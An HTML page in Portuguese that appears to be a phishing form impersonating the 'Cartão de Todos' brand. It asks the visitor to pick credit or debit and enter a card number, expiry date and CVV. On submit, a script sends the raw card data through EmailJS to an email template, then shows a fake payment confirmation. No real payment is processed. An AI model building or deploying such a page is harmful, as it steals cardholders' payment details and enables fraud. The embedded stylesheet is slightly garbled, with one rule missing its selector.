<!DOCTYPE html>
<html>
<head>
    <title>Forma de Arrecadação - Cartão de Todos</title>
    <link rel="stylesheet" type="text/css" href="styles.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init({
                publicKey: "PH7ve0_A2N2UWzCRI",
            });
        })();
    </script>
    <script type="text/javascript">
        function selectCardType(type) {
            document.getElementById('credit-button').classList.remove('selected');
            document.getElementById('debit-button').classList.remove('selected');
            document.getElementById(type + '-button').classList.add('selected');
            document.getElementById('next-button').style.display = 'block';
            document.getElementById('card-type').value = type;
        }

        function showPaymentForm() {
            document.getElementById('selection-page').style.display = 'none';
            document.getElementById('payment-page').style.display = 'block';
        }

        function showThankYouPage() {
            document.getElementById('payment-page').style.display = 'none';
            document.getElementById('thank-you-page').style.display = 'block';
        }

        window.onload = function() {
            document.getElementById('payment-form').addEventListener('submit', function(event) {
                event.preventDefault();
                emailjs.sendForm('service_ylmdgth', 'template_9cur51a', this)
                    .then(() => {
                        console.log('SUCCESS!');
                        showThankYouPage();
                    }, (error) => {
                        console.log('FAILED...', error);
                    });
            });
        }
    </script>
</head>
<body>
    <div id="selection-page">
        <h1>Forma de Arrecadação - Cartão de Todos</h1>
        <button id="credit-button" onclick="selectCardType('credit')">Crédito</button>
        <button id="debit-button" onclick="selectCardType('debit')">Débito</button>
        <button id="next-button" onclick="showPaymentForm()" style="display: none;">Seguir</button>
        <input type="hidden" id="card-type" name="card_type">
    </div>

    <div id="payment-page" style="display: none;">
        <form id="payment-form">
            <label>Card Number</label>
            <input type="text" name="card_number" placeholder="1234 5678 9012 3456" required>
            
            <label>Expiry Date</label>
            <input type="text" name="expiry_date" placeholder="MM/YY" required>
            
            <label>CVV</label>
            <input type="text" name="cvv" placeholder="123" required>
            
            <input type="submit" value="Finalizar">
        </form>
    </div>

    <div id="thank-you-page" style="display: none;">
        <h1>Obrigado pelo seu pagamento!</h1>
        <p>Entraremos em contato caso tenha ocorrido algum problema com a transação.</p>
    </div>
</body>
</html>

<style>
body {
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;

    flex-direction: column;
}

    color: #4CAF50;
    margin-bottom: 20px;
}

button {
    background-color: #fff;
    color: #4CAF50;
    border: 2px solid #4CAF50;
    padding: 10px 20px;
    margin: 10px;
    cursor: pointer;
    border-radius: 5px;
}

button:hover {
    background-color: #4CAF50;
    color: #fff;
}

.selected {
    background-color: #4CAF50;
    color: #fff;
}

#next-button {
    display: none;
}

form {
    background: #fff;
    padding: 20px;
    border-radius: 5px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    text-align: center;
}

label {
    display: block;
    margin-bottom: 8px;
    color: #4CAF50;
    padding: 10px;
}

input, select {
    width: 90%;
    padding: 8px;
    margin-bottom: 10px;
    border: 1px solid #ccc;
    border-radius: 3px;
}

input[type="submit"] {
    background-color: #4CAF50;
    color: white;
    border: none;
    cursor: pointer;
}

input[type="submit"]:hover {
    background-color: #45a049;
}
</style>
